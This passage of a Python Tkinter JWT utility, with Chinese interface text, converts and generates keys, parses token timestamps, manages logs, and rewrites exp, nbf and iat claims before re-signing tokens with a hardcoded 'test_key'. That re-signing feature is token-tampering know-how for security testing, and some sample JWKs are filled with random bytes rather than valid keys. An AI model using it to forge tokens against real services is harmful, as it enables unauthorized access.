                    elif output_format == "DER":
                        self.key_output.insert(tk.END, "Base64到DER转换:\n")
                        self.key_output.insert(tk.END, f"echo '{key_input}' | base64 -d > key.der\n")
                    elif output_format == "JWK":
                        self.key_output.insert(tk.END, "{\n")
                        self.key_output.insert(tk.END, '  "kty": "oct",\n')
                        self.key_output.insert(tk.END, f'  "k": "{base64.urlsafe_b64encode(key_bytes).decode().rstrip("=")}"\n')
                        self.key_output.insert(tk.END, "}\n")
                    elif output_format == "Base64":
                        self.key_output.insert(tk.END, key_input)
                    elif output_format == "HEX":
                        self.key_output.insert(tk.END, key_bytes.hex())
                        
                except Exception:
                    self.key_output.insert(tk.END, "无效的Base64格式密钥\n")
                    
            elif input_format == "JWK":
                # JWK格式处理
                try:
                    jwk = json.loads(key_input)
                    
                    if output_format == "PEM":
                        self.key_output.insert(tk.END, "JWK到PEM转换需要额外的库支持，请使用jwk-to-pem工具:\n")
                        self.key_output.insert(tk.END, f"npm install -g jwk-to-pem\n")
                        self.key_output.insert(tk.END, f"echo '{key_input}' | jwk-to-pem\n")
                    elif output_format == "DER":
                        self.key_output.insert(tk.END, "JWK到DER转换需要额外的库支持\n")
                    elif output_format == "JWK":
                        self.key_output.insert(tk.END, json.dumps(jwk, indent=2))
                    elif output_format == "Base64":
                        if 'k' in jwk:
                            self.key_output.insert(tk.END, base64.b64encode(base64.urlsafe_b64decode(jwk['k'] + '==')).decode())
                        else:
                            self.key_output.insert(tk.END, "JWK中缺少k字段，无法转换为Base64\n")
                            
                except json.JSONDecodeError:
                    self.key_output.insert(tk.END, "无效的JWK格式密钥\n")
                    
        except Exception as e:
            self.key_output.insert(tk.END, f"转换密钥时出错: {str(e)}\n")
            
        self.key_output.config(state=tk.DISABLED)
        
    def generate_new_key(self):
        """生成新密钥"""
        key_type = self.key_type_var.get()
        key_size = int(self.key_size_var.get())
        
        # 清空结果区域
        self.key_output.config(state=tk.NORMAL)
        self.key_output.delete("1.0", tk.END)
        
        try:
            if key_type == "HMAC":
                # 生成HMAC密钥
                key_bytes = os.urandom(key_size // 8)
                key_b64 = base64.b64encode(key_bytes).decode()
                key_hex = key_bytes.hex()
                
                self.key_output.insert(tk.END, f"HMAC密钥 ({key_size}位):\n\n")
                self.key_output.insert(tk.END, f"Base64:\n{key_b64}\n\n")
                self.key_output.insert(tk.END, f"HEX:\n{key_hex}\n\n")
                self.key_output.insert(tk.END, f"JWK格式:\n")
                self.key_output.insert(tk.END, "{\n")
                self.key_output.insert(tk.END, f'  "kty": "oct",\n')
                self.key_output.insert(tk.END, f'  "k": "{base64.urlsafe_b64encode(key_bytes).decode().rstrip("=")}"\n')
                self.key_output.insert(tk.END, "}\n")
                
            elif key_type == "RSA":
                # 生成RSA密钥
                self.key_output.insert(tk.END, f"RSA密钥 ({key_size}位)生成需要OpenSSL支持:\n\n")
                self.key_output.insert(tk.END, f"请使用以下命令生成RSA密钥:\n")
                self.key_output.insert(tk.END, f"openssl genrsa -out rsa_private_{key_size}.pem {key_size}\n")
                self.key_output.insert(tk.END, f"openssl rsa -in rsa_private_{key_size}.pem -pubout -out rsa_public_{key_size}.pem\n")
                
                # 提供JWK示例
                self.key_output.insert(tk.END, f"\nJWK公钥示例:\n")
                self.key_output.insert(tk.END, "{\n")
                self.key_output.insert(tk.END, f'  "kty": "RSA",\n')
                self.key_output.insert(tk.END, f'  "n": "{base64.urlsafe_b64encode(os.urandom(key_size // 8)).decode().rstrip("=")}",\n')
                self.key_output.insert(tk.END, f'  "e": "AQAB",\n')
                self.key_output.insert(tk.END, f'  "alg": "RS{key_size}"\n')
                self.key_output.insert(tk.END, "}\n")
                
            elif key_type == "EC":
                # 生成EC密钥
                curve = "P-256"  # 默认曲线
                if key_size == 384:
                    curve = "P-384"
                elif key_size == 521:
                    curve = "P-521"
                    
                self.key_output.insert(tk.END, f"EC密钥 ({curve})生成需要OpenSSL支持:\n\n")
                self.key_output.insert(tk.END, f"请使用以下命令生成EC密钥:\n")
                self.key_output.insert(tk.END, f"openssl ecparam -name {curve} -genkey -noout -out ec_private_{curve}.pem\n")
                self.key_output.insert(tk.END, f"openssl ec -in ec_private_{curve}.pem -pubout -out ec_public_{curve}.pem\n")
                
                # 提供JWK示例
                self.key_output.insert(tk.END, f"\nJWK公钥示例:\n")
                self.key_output.insert(tk.END, "{\n")
                self.key_output.insert(tk.END, f'  "kty": "EC",\n')
                self.key_output.insert(tk.END, f'  "crv": "{curve}",\n')
                self.key_output.insert(tk.END, f'  "x": "{base64.urlsafe_b64encode(os.urandom(32)).decode().rstrip("=")}",\n')
                self.key_output.insert(tk.END, f'  "y": "{base64.urlsafe_b64encode(os.urandom(32)).decode().rstrip("=")}",\n')
                self.key_output.insert(tk.END, f'  "alg": "ES{key_size}"\n')
                self.key_output.insert(tk.END, "}\n")
                
        except Exception as e:
            self.key_output.insert(tk.END, f"生成密钥时出错: {str(e)}\n")
            
        self.key_output.config(state=tk.DISABLED)
        
    # 高级时间戳操作事件处理
    def parse_timestamp_jwt(self):
        """解析时间戳JWT"""
        jwt_token = self.timestamp_jwt_input.get("1.0", tk.END).strip()
        
        if not jwt_token:
            messagebox.showerror("错误", "请输入JWT令牌")
            return
            
        # 清空结果区域
        self.timestamp_result.config(state=tk.NORMAL)
        self.timestamp_result.delete("1.0", tk.END)
        
        # 解析JWT
        header, payload, signature, contents = self.jwt_core.validateToken(jwt_token)
        if not header:
            self.timestamp_result.insert(tk.END, "无效的JWT令牌\n")
            self.timestamp_result.config(state=tk.DISABLED)
            return
            
        self.timestamp_result.insert(tk.END, f"JWT解析结果:\n\n")
        self.timestamp_result.insert(tk.END, f"Header: {json.dumps(header, indent=2)}\n\n")
        self.timestamp_result.insert(tk.END, f"Payload: {json.dumps(payload, indent=2)}\n\n")
        
        # 分析时间戳相关声明
        self.timestamp_result.insert(tk.END, "时间戳声明分析:\n\n")
        
        current_time = int(time.time())
        current_datetime = datetime.fromtimestamp(current_time)
        
        # 检查exp (Expiration Time)
        if 'exp' in payload:
            exp_time = payload['exp']
            exp_datetime = datetime.fromtimestamp(exp_time)
            is_expired = current_time > exp_time
            time_remaining = exp_time - current_time
            
            self.timestamp_result.insert(tk.END, f"exp (过期时间): {exp_time}\n")
            self.timestamp_result.insert(tk.END, f"  对应时间: {exp_datetime}\n")
            self.timestamp_result.insert(tk.END, f"  当前时间: {current_datetime}\n")
            self.timestamp_result.insert(tk.END, f"  是否过期: {'是' if is_expired else '否'}\n")
            if not is_expired:
                hours, remainder = divmod(time_remaining, 3600)
                minutes, seconds = divmod(remainder, 60)
                self.timestamp_result.insert(tk.END, f"  剩余时间: {hours}小时 {minutes}分钟 {seconds}秒\n")
            self.timestamp_result.insert(tk.END, "\n")
            
        # 检查nbf (Not Before)
        if 'nbf' in payload:
            nbf_time = payload['nbf']
            nbf_datetime = datetime.fromtimestamp(nbf_time)
            is_valid = current_time >= nbf_time
            time_until = nbf_time - current_time
            
            self.timestamp_result.insert(tk.END, f"nbf (生效时间): {nbf_time}\n")
            self.timestamp_result.insert(tk.END, f"  对应时间: {nbf_datetime}\n")
            self.timestamp_result.insert(tk.END, f"  当前时间: {current_datetime}\n")
            self.timestamp_result.insert(tk.END, f"  是否生效: {'是' if is_valid else '否'}\n")
            if not is_valid:
                hours, remainder = divmod(time_until, 3600)
                minutes, seconds = divmod(remainder, 60)
                self.timestamp_result.insert(tk.END, f"  距离生效: {hours}小时 {minutes}分钟 {seconds}秒\n")
            self.timestamp_result.insert(tk.END, "\n")
            
        # 检查iat (Issued At)
        if 'iat' in payload:
            iat_time = payload['iat']
            iat_datetime = datetime.fromtimestamp(iat_time)
            time_elapsed = current_time - iat_time
            
            self.timestamp_result.insert(tk.END, f"iat (签发时间): {iat_time}\n")
            self.timestamp_result.insert(tk.END, f"  对应时间: {iat_datetime}\n")
            self.timestamp_result.insert(tk.END, f"  当前时间: {current_datetime}\n")
            hours, remainder = divmod(time_elapsed, 3600)
            minutes, seconds = divmod(remainder, 60)
            self.timestamp_result.insert(tk.END, f"  已经过去: {hours}小时 {minutes}分钟 {seconds}秒\n")
            self.timestamp_result.insert(tk.END, "\n")
            
        self.timestamp_result.config(state=tk.DISABLED)
        
    def modify_timestamps(self):
        """修改时间戳"""
        jwt_token = self.timestamp_jwt_input.get("1.0", tk.END).strip()
        operation = self.timestamp_operation_var.get()
        
        if not jwt_token:
            messagebox.showerror("错误", "请输入JWT令牌")
            return
            
        # 解析JWT
        header, payload, signature, contents = self.jwt_core.validateToken(jwt_token)
        if not header:
            messagebox.showerror("错误", "无效的JWT令牌")
            return
            
        # 修改时间戳
        modified_payload = payload.copy()
        current_time = int(time.time())
        
        if operation == "extend_exp":
            # 延长过期时间
            if 'exp' in modified_payload:
                modified_payload['exp'] = current_time + 86400  # 延长24小时
            else:
                modified_payload['exp'] = current_time + 86400
                
        elif operation == "remove_exp":
            # 移除过期时间
            if 'exp' in modified_payload:
                del modified_payload['exp']
                
        elif operation == "set_past_exp":
            # 设置为已过期
            modified_payload['exp'] = current_time - 3600  # 1小时前过期
            
        elif operation == "set_future_nbf":
            # 设置为未来生效
            modified_payload['nbf'] = current_time + 3600  # 1小时后生效
            
        elif operation == "remove_nbf":
            # 移除生效时间
            if 'nbf' in modified_payload:
                del modified_payload['nbf']
                
        elif operation == "refresh_iat":
            # 刷新签发时间
            modified_payload['iat'] = current_time
            
        # 生成新的JWT
        new_jwt = self.jwt_core.signToken(header, modified_payload, 'test_key', 'HS256')
        
        if new_jwt:
            # 显示修改后的JWT
            self.timestamp_result.config(state=tk.NORMAL)
            self.timestamp_result.delete("1.0", tk.END)
            self.timestamp_result.insert(tk.END, "修改后的JWT:\n\n")
            self.timestamp_result.insert(tk.END, new_jwt)
            self.timestamp_result.config(state=tk.DISABLED)
        else:
            messagebox.showerror("错误", "生成修改后的JWT失败")
            
    def batch_timestamp_operations(self):
        """批量时间戳操作"""
        jwt_token = self.timestamp_jwt_input.get("1.0", tk.END).strip()
        
        if not jwt_token:
            messagebox.showerror("错误", "请输入JWT令牌")
            return
            
        # 解析JWT
        header, payload, signature, contents = self.jwt_core.validateToken(jwt_token)
        if not header:
            messagebox.showerror("错误", "无效的JWT令牌")
            return
            
        # 清空结果区域
        self.timestamp_result.config(state=tk.NORMAL)
        self.timestamp_result.delete("1.0", tk.END)
        
        self.timestamp_result.insert(tk.END, "批量时间戳操作结果:\n\n")
        
        # 生成多个不同时间戳的JWT
        current_time = int(time.time())
        
        # 1. 原始JWT
        self.timestamp_result.insert(tk.END, "1. 原始JWT:\n")
        self.timestamp_result.insert(tk.END, f"   {jwt_token}\n\n")
        
        # 2. 延长过期时间
        modified_payload = payload.copy()
        if 'exp' in modified_payload:
            modified_payload['exp'] = current_time + 86400  # 延长24小时
        else:
            modified_payload['exp'] = current_time + 86400
            
        extended_jwt = self.jwt_core.signToken(header, modified_payload, 'test_key', 'HS256')
        if extended_jwt:
            self.timestamp_result.insert(tk.END, "2. 延长过期时间(24小时):\n")
            self.timestamp_result.insert(tk.END, f"   {extended_jwt}\n\n")
            
        # 3. 移除过期时间
        modified_payload = payload.copy()
        if 'exp' in modified_payload:
            del modified_payload['exp']
            
        no_exp_jwt = self.jwt_core.signToken(header, modified_payload, 'test_key', 'HS256')
        if no_exp_jwt:
            self.timestamp_result.insert(tk.END, "3. 移除过期时间:\n")
            self.timestamp_result.insert(tk.END, f"   {no_exp_jwt}\n\n")
            
        # 4. 设置为已过期
        modified_payload = payload.copy()
        modified_payload['exp'] = current_time - 3600  # 1小时前过期
            
        expired_jwt = self.jwt_core.signToken(header, modified_payload, 'test_key', 'HS256')
        if expired_jwt:
            self.timestamp_result.insert(tk.END, "4. 设置为已过期(1小时前):\n")
            self.timestamp_result.insert(tk.END, f"   {expired_jwt}\n\n")
            
        # 5. 设置为未来生效
        modified_payload = payload.copy()
        modified_payload['nbf'] = current_time + 3600  # 1小时后生效
            
        future_nbf_jwt = self.jwt_core.signToken(header, modified_payload, 'test_key', 'HS256')
        if future_nbf_jwt:
            self.timestamp_result.insert(tk.END, "5. 设置为未来生效(1小时后):\n")
            self.timestamp_result.insert(tk.END, f"   {future_nbf_jwt}\n\n")
            
        # 6. 刷新签发时间
        modified_payload = payload.copy()
        modified_payload['iat'] = current_time
            
        refreshed_jwt = self.jwt_core.signToken(header, modified_payload, 'test_key', 'HS256')
        if refreshed_jwt:
            self.timestamp_result.insert(tk.END, "6. 刷新签发时间(当前时间):\n")
            self.timestamp_result.insert(tk.END, f"   {refreshed_jwt}\n\n")
            
        self.timestamp_result.config(state=tk.DISABLED)
        
    # 日志记录系统事件处理
    def configure_logging(self):
        """配置日志记录"""
        log_level = self.log_level_var.get()
        log_file = self.log_file_var.get()
        
        # 配置日志系统
        try:
            # 设置日志级别
            if log_level == "DEBUG":
                level = logging.DEBUG
            elif log_level == "INFO":
                level = logging.INFO
            elif log_level == "WARNING":
                level = logging.WARNING
            elif log_level == "ERROR":
                level = logging.ERROR
            else:  # CRITICAL
                level = logging.CRITICAL
                
            # 配置日志格式
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            
            # 配置文件处理器
            if log_file:
                file_handler = logging.FileHandler(log_file)
                file_handler.setFormatter(formatter)
                
            # 配置控制台处理器
            console_handler = logging.StreamHandler()
            console_handler.setFormatter(formatter)
            
            # 配置根日志记录器
            root_logger = logging.getLogger()
            root_logger.setLevel(level)
            
            # 清除现有处理器
            for handler in root_logger.handlers[:]:
                root_logger.removeHandler(handler)
                
            # 添加新处理器
            if log_file:
                root_logger.addHandler(file_handler)
            root_logger.addHandler(console_handler)
            
            # 记录配置成功消息
            logging.info("日志系统配置成功")
            logging.info(f"日志级别: {log_level}")
            if log_file:
                logging.info(f"日志文件: {log_file}")
                
            messagebox.showinfo("成功", "日志系统配置成功")
            
        except Exception as e:
            messagebox.showerror("错误", f"配置日志系统失败: {str(e)}")
            
    def view_logs(self):
        """查看日志"""
        log_file = self.log_file_var.get()
        
        if not log_file or not os.path.exists(log_file):
            messagebox.showerror("错误", "日志文件不存在或未指定")
            return
            
        try:
            # 读取日志文件
            with open(log_file, 'r', encoding='utf-8') as f:
                log_content = f.read()
                
            # 显示日志内容
            self.log_display.config(state=tk.NORMAL)
            self.log_display.delete("1.0", tk.END)
            self.log_display.insert(tk.END, log_content)
            self.log_display.config(state=tk.DISABLED)
            
        except Exception as e:
            messagebox.showerror("错误", f"读取日志文件失败: {str(e)}")
            
    def clear_logs(self):
        """清空日志"""
        log_file = self.log_file_var.get()
        
        if not log_file:
            messagebox.showerror("错误", "未指定日志文件")
            return
            
        result = messagebox.askyesno("确认", "确定要清空日志文件吗？")
        if result:
            try:
                # 清空日志文件
                with open(log_file, 'w', encoding='utf-8') as f:
                    f.write("")
                    
                # 清空日志显示
                self.log_display.config(state=tk.NORMAL)
                self.log_display.delete("1.0", tk.END)
                self.log_display.config(state=tk.DISABLED)
                
                messagebox.showinfo("成功", "日志文件已清空")
                
            except Exception as e:
                messagebox.showerror("错误", f"清空日志文件失败: {str(e)}")
                
    def export_logs(self):
        """导出日志"""
        log_file = self.log_file_var.get()
        
        if not log_file or not os.path.exists(log_file):
            messagebox.showerror("错误", "日志文件不存在或未指定")
            return
            
        # 选择导出文件
        export_file = filedialog.asksaveasfilename(
            title="导出日志",
            defaultextension=".txt",
            filetypes=[("文本文件", "*.txt"), ("所有文件", "*.*")]
        )
        
        if export_file:
            try:
                # 读取日志文件
                with open(log_file, 'r', encoding='utf-8') as f:
                    log_content = f.read()
                    
                # 写入导出文件
                with open(export_file, 'w', encoding='utf-8') as f:
                    f.write(log_content)
                    
                messagebox.showinfo("成功", f"日志已导出到: {export_file}")
                
            except Exception as e:
                messagebox.showerror("错误", f"导出日志失败: {str(e)}")
                
    def show_log_statistics(self):
        """显示日志统计"""
        log_file = self.log_file_var.get()
        
        if not log_file or not os.path.exists(log_file):
            messagebox.showerror("错误", "日志文件不存在或未指定")
            return
            
        try:
            # 读取日志文件
            with open(log_file, 'r', encoding='utf-8') as f:
                log_lines = f.readlines()
                
            # 统计日志级别
            debug_count = sum(1 for line in log_lines if " - DEBUG - " in line)
            info_count = sum(1 for line in log_lines if " - INFO - " in line)
            warning_count = sum(1 for line in log_lines if " - WARNING - " in line)
            error_count = sum(1 for line in log_lines if " - ERROR - " in line)
            critical_count = sum(1 for line in log_lines if " - CRITICAL - " in line)
            
            # 显示统计信息
            stats_window = tk.Toplevel(self.root)
            stats_window.title("日志统计")
            stats_window.geometry("400x300")
            
            stats_text = scrolledtext.ScrolledText(stats_window, wrap=tk.WORD, width=50, height=15)
            stats_text.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)
            
            stats_text.insert(tk.END, f"日志文件: {log_file}\n\n")
            stats_text.insert(tk.END, f"总行数: {len(log_lines)}\n\n")
            stats_text.insert(tk.END, "日志级别统计:\n")
            stats_text.insert(tk.END, f"  DEBUG: {debug_count}\n")
            stats_text.insert(tk.END, f"  INFO: {info_count}\n")
            stats_text.insert(tk.END, f"  WARNING: {warning_count}\n")
            stats_text.insert(tk.END, f"  ERROR: {error_count}\n")
            stats_text.insert(tk.END, f"  CRITICAL: {critical_count}\n")
            
            stats_text.config(state=tk.DISABLED)
            
        except Exception as e:
            messagebox.showerror("错误", f"显示日志统计失败: {str(e)}")


# 主程序
if __name__ == "__main__":
    root = tk.Tk()
    app = JWTToolGUI(root)
    root.mainloop()